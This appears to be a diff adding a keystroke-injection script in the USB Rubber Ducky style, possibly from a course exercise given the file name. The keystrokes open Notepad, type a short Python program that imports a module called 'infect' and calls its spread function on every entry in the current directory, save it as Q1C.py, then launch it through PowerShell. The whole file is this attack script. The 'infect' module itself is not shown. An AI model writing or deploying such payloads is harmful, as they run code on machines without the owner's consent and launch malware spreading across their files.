@@ -1,0 +1,27 @@
+WINDOWS r
+DELAY 1000
+STRING notepad
+ENTER
+DELAY 1000
+CTRL t
+DELAY 500
+STRING import os
+ENTER
+STRING import infect
+ENTER
+STRING dir_list = os.listdir()
+ENTER
+STRING infect.spread(dir_list)
+DELAY 1000
+CTRL s
+DELAY 1000
+STRING Q1C.py
+DELAY 500
+ENTER
+WINDOWS r
+DELAY 1000
+STRING powershell 
+ENTER
+DELAY 1000
+STRING python ./Q1C.py
+ENTER
